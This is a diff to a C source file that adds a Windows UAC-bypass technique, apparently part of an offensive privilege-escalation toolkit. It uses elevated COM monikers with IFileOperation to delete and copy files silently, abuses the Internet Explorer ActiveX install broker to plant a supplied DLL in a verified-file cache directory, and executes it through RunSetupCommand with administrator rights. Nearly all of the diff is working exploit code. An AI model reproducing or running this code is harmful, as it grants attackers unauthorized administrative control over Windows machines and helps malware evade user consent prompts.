@@ -1,5 +1,76 @@
 #include "pch.h"
 
+typedef interface IIEAdminBrokerObject IIEAdminBrokerObject;
+typedef interface IActiveXInstallBroker IActiveXInstallBroker;
+
+typedef struct IIEAdminBrokerObjectVtbl {
+	BEGIN_INTERFACE
+
+	HRESULT(STDMETHODCALLTYPE* QueryInterface)(
+			__RPC__in IIEAdminBrokerObject* This,
+			__RPC__in REFIID riid,
+			_COM_Outptr_  void** ppvObject);
+
+	ULONG(STDMETHODCALLTYPE* AddRef)(
+		__RPC__in IIEAdminBrokerObject* This);
+
+	ULONG(STDMETHODCALLTYPE* Release)(
+		__RPC__in IIEAdminBrokerObject* This);
+
+	HRESULT(STDMETHODCALLTYPE* InitializeAdminInstaller)(
+		__RPC__in IIEAdminBrokerObject* This,
+		_In_opt_ LPCOLESTR ProviderName,
+		_In_ DWORD Unknown0,
+		_COM_Outptr_ void** InstanceGuid);
+
+	END_INTERFACE
+} *PIIEAdminBrokerObjectVtbl;
+
+typedef struct IActiveXInstallBrokerVtbl {
+	BEGIN_INTERFACE
+
+	HRESULT(STDMETHODCALLTYPE* QueryInterface)(
+			__RPC__in IActiveXInstallBroker* This,
+			__RPC__in REFIID riid,
+			_COM_Outptr_  void** ppvObject);
+
+	ULONG(STDMETHODCALLTYPE* AddRef)(
+		__RPC__in IActiveXInstallBroker* This);
+
+	ULONG(STDMETHODCALLTYPE* Release)(
+		__RPC__in IActiveXInstallBroker* This);
+
+	HRESULT(STDMETHODCALLTYPE* VerifyFile)(
+		__RPC__in IActiveXInstallBroker* This,
+		_In_ BSTR InstanceGuid,
+		_In_ HWND ParentWindow,
+		_In_ BSTR Unknown0,
+		_In_ BSTR pcwszFilePath,
+		_In_ BSTR Unknown1,
+		_In_ ULONG dwUIChoice,
+		_In_ ULONG dwUIContext,
+		_In_ REFGUID GuidKey,
+		_Out_ BSTR* VerifiedFileName,
+		_Out_ PULONG CertDetailsSize,
+		_Out_ void** CertDetails);
+
+	HRESULT(STDMETHODCALLTYPE* RunSetupCommand)(
+		__RPC__in IActiveXInstallBroker* This,
+		_In_ BSTR InstanceGuid,
+		_In_ HWND ParentWindow,
+		_In_ BSTR szCmdName,
+		_In_ BSTR szInfSection,
+		_In_ BSTR szDir,
+		_In_ BSTR szTitle,
+		_In_ ULONG dwFlags,
+		_Out_ PHANDLE lpTargetHandle);
+
+	END_INTERFACE
+} *PIActiveXInstallBrokerVtbl;
+
+interface IIEAdminBrokerObject { CONST_VTBL struct IIEAdminBrokerObjectVtbl* lpVtbl; };
+interface IActiveXInstallBroker { CONST_VTBL struct IActiveXInstallBrokerVtbl* lpVtbl; };
+
 BOOL BypassByOsk
 (
 	_In_ LPSTR lpCommandLine
@@ -149,25 +220,292 @@ CLEANUP:
 	return Result;
 }
 
-BOOL IeAddOnInstallMethod
+BOOL MasqueradedDeleteDirectoryFileCOM
 (
-	_In_ LPSTR lpCommandLine
+	_In_ LPWSTR lpFilePath
 )
 {
-	HRESULT hResult;
+	BOOL  Result = FALSE;
+	IFileOperation* pFileOperation = NULL;
+	IShellItem* pShellItem = NULL;
+	HRESULT hResult = E_FAIL;
+	HRESULT hResultInit = E_FAIL;
+	BIND_OPTS3 BindOpts;
+	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}";
 
-	hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
+	BindOpts.cbStruct = sizeof(BindOpts);
+	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
+	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
 	if (FAILED(hResult)) {
-		LogError(L"CoInitializeEx failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		LogError(L"CoGetObject failed at %lls", __FUNCTIONW__);
 		goto CLEANUP;
 	}
 
+	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
+	if (FAILED(hResult)) {
+		LogError(L"SetOperationFlags failed at %lls", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	hResult = SHCreateItemFromParsingName(lpFilePath, NULL, &IID_IShellItem, &pShellItem);
+	if (FAILED(hResult)) {
+		LogError(L"SHCreateItemFromParsingName failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		goto CLEANUP;
+	}
+
+	hResult = pFileOperation->lpVtbl->DeleteItem(pFileOperation, pShellItem, NULL);
+	if (FAILED(hResult)) {
+		LogError(L"DeleteItem failed at %lls", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	hResult = pFileOperation->lpVtbl->PerformOperations(pFileOperation);
+	if (FAILED(hResult)) {
+		LogError(L"PerformOperations failed at %lls", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	if (pFileOperation != NULL) {
+		pFileOperation->lpVtbl->Release(pFileOperation);
+	}
+
+	if (pShellItem != NULL) {
+		pShellItem->lpVtbl->Release(pShellItem);
+	}
+
+	if (hResultInit == S_OK) {
+		CoUninitialize();
+	}
+
+	return Result;
+}
+
+BOOL MasqueradedMoveDirectoryFileCOM
+(
+	_In_ LPWSTR lpSrcFileName,
+	_In_ LPWSTR lpDestPath,
+	_In_ BOOL IsMove
+)
+{
+	BOOL  Result = FALSE;
+	IFileOperation* pFileOperation = NULL;
+	IShellItem* pSrcItem = NULL;
+	IShellItem* pDestItem = NULL;
+	HRESULT hResult = E_FAIL;
+	HRESULT hResultInit = E_FAIL;
+	BIND_OPTS3 BindOpts;
+	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}";
+
+	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
+	BindOpts.cbStruct = sizeof(BindOpts);
+	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
+	//hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
+	hResult = CoCreateInstance(&CLSID_FileOperation, NULL, CLSCTX_ALL, &IID_IFileOperation , &pFileOperation);
+	if (FAILED(hResult)) {
+		LogError(L"CoGetObject failed at %lls", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION | FOFX_SHOWELEVATIONPROMPT | FOF_SILENT | FOF_NOERRORUI);
+	if (FAILED(hResult)) {
+		LogError(L"SetOperationFlags failed at %lls", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	hResult = SHCreateItemFromParsingName(lpSrcFileName, NULL, &IID_IShellItem, &pSrcItem);
+	if (FAILED(hResult)) {
+		LogError(L"SHCreateItemFromParsingName failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		goto CLEANUP;
+	}
+
+	hResult = SHCreateItemFromParsingName(lpDestPath, NULL, &IID_IShellItem, &pDestItem);
+	if (FAILED(hResult)) {
+		LogError(L"SHCreateItemFromParsingName failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		goto CLEANUP;
+	}
+
+	if (IsMove) {
+		hResult = pFileOperation->lpVtbl->MoveItem(pFileOperation, pSrcItem, pDestItem, NULL, NULL);
+	}
+	else {
+		hResult = pFileOperation->lpVtbl->CopyItem(pFileOperation, pSrcItem, pDestItem, NULL, NULL);
+	}
+
+	if (FAILED(hResult)) {
+		LogError(L"DeleteItem failed at %lls", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	hResult = pFileOperation->lpVtbl->PerformOperations(pFileOperation);
+	if (FAILED(hResult)) {
+		LogError(L"PerformOperations failed at %lls", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	if (pFileOperation != NULL) {
+		pFileOperation->lpVtbl->Release(pFileOperation);
+	}
+
+	if (pSrcItem != NULL) {
+		pSrcItem->lpVtbl->Release(pSrcItem);
+	}
+
+	if (pDestItem != NULL) {
+		pDestItem->lpVtbl->Release(pDestItem);
+	}
+
+	if (hResultInit == S_OK) {
+		CoUninitialize();
+	}
+
+	return Result;
+}
+
+BOOL IeAddOnInstallMethod
+(
+	_In_ PBYTE pBuffer,
+	_In_ DWORD cbBuffer
+)
+{
+	HRESULT hResult = E_FAIL;
+	HRESULT hResultInit = E_FAIL;
+	BIND_OPTS3 BindOpts;
+	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}";
+	GUID IID_IEAxiAdminInstaller = { 0x9AEA8A59, 0xE0C9, 0x40F1, { 0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77 } };
+	GUID IID_IEAxiInstaller2 = { 0xBC0EC710, 0xA3ED, 0x4F99, { 0xB1, 0x4F, 0x5F, 0xD5, 0x9F, 0xDA, 0xCE, 0xA3 } };
+	IIEAdminBrokerObject* BrokerObject = NULL;
+	BSTR CacheItemFilePath = NULL;
+	DWORD cbCacheItemFilePath = 0;
+	IActiveXInstallBroker* InstallBroker = NULL;
+	BSTR AdminInstallerUuid = NULL;
+	WCHAR wszConsentPath[MAX_PATH];
+	BSTR FileToVerify = NULL;
+	PBYTE pDummy = NULL;
+	DWORD cbDummy = 0;
+	LPWSTR lpDllPath = NULL;
+	LPWSTR lpDirPath = NULL;
+	BSTR WorkDir = NULL;
+	WCHAR wszTempPath[MAX_PATH];
+	BSTR EmptyBstr = NULL;
+	HANDLE hProc = NULL;
+	BOOL Result = FALSE;
+
+	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 	if (FAILED(hResult)) {
 		LogError(L"CoInitializeSecurity failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
 		goto CLEANUP;
 	}
 
+	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
+	BindOpts.cbStruct = sizeof(BindOpts);
+	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
+	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IEAxiAdminInstaller, &BrokerObject);
+	if (FAILED(hResult)) {
+		LogError(L"CoGetObject failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
+		goto CLEANUP;
+	}
 
+	hResult = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject, NULL, 0, &AdminInstallerUuid);
+	if (FAILED(hResult)) {
+		LogError(L"InitializeAdminInstaller failed at %lls.\n", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	hResult = BrokerObject->lpVtbl->QueryInterface(BrokerObject, &IID_IEAxiInstaller2, &InstallBroker);
+	if (FAILED(hResult)) {
+		LogError(L"InitializeAdminInstaller failed at %lls.\n", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	GetSystemDirectoryW(wszConsentPath, _countof(wszConsentPath));
+	lstrcatW(wszConsentPath, L"\\consent.exe");
+	FileToVerify = SysAllocString(wszConsentPath);
+	if (FileToVerify != NULL) {
+		hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &pDummy, &cbDummy);
+		if (FAILED(hResult)) {
+			LogError(L"VerifyFile failed at %lls.\n", __FUNCTIONW__);
+			goto CLEANUP;
+		}
+
+		CoTaskMemFree(pDummy);
+		SysFreeString(FileToVerify);
+	}
+
+	if (!MasqueradedDeleteDirectoryFileCOM(CacheItemFilePath)) {
+		goto CLEANUP;
+	}
+
+	cbCacheItemFilePath = SysStringLen(CacheItemFilePath);
+	lpDllPath = ALLOC(cbCacheItemFilePath * sizeof(WCHAR));
+	GetTempPathW(wszTempPath, _countof(wszTempPath));
+	swprintf_s(lpDllPath, cbCacheItemFilePath, L"%lls\\%lls", wszTempPath, PathFindFileNameW(CacheItemFilePath));
+	if (!WriteToFile(lpDllPath, pBuffer, cbBuffer)) {
+		goto CLEANUP;
+	}
+
+	lpDirPath = DuplicateStrW(CacheItemFilePath, 0);
+	PathRemoveFileSpecW(lpDirPath);
+	if (!MasqueradedMoveDirectoryFileCOM(lpDllPath, lpDirPath, FALSE)) {
+		goto CLEANUP;
+	}
+
+	WorkDir = SysAllocString(wszTempPath);
+	EmptyBstr = SysAllocString(L"");
+	hResult = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker, AdminInstallerUuid, NULL, CacheItemFilePath, EmptyBstr, WorkDir, EmptyBstr, 4, &hProc);
+	if (FAILED(hResult)) {
+		LogError(L"RunSetupCommand failed at %lls.\n", __FUNCTIONW__);
+		goto CLEANUP;
+	}
+
+	if (hResult == E_INVALIDARG && lpDirPath != NULL) {
+		MasqueradedDeleteDirectoryFileCOM(lpDirPath);
+	}
+
+	Result = TRUE;
 CLEANUP:
+	if (InstallBroker) {
+		InstallBroker->lpVtbl->Release(InstallBroker);
+	}
+
+	if (BrokerObject) {
+		BrokerObject->lpVtbl->Release(BrokerObject);
+	}
+
+	if (lpDllPath != NULL) {
+		FREE(lpDllPath);
+	}
+
+	if (lpDirPath != NULL) {
+		FREE(lpDirPath);
+	}
+
+	if (WorkDir != NULL) {
+		SysFreeString(WorkDir);
+	}
+
+	if (EmptyBstr != NULL) {
+		SysFreeString(EmptyBstr);
+	}
+
+	if (AdminInstallerUuid != NULL) {
+		SysFreeString(AdminInstallerUuid);
+	}
+	
+	if (CacheItemFilePath != NULL) {
+		SysFreeString(CacheItemFilePath);
+	}
+
+	if (hResultInit == S_OK) {
+		CoUninitialize();
+	}
+
+	return Result;
 }
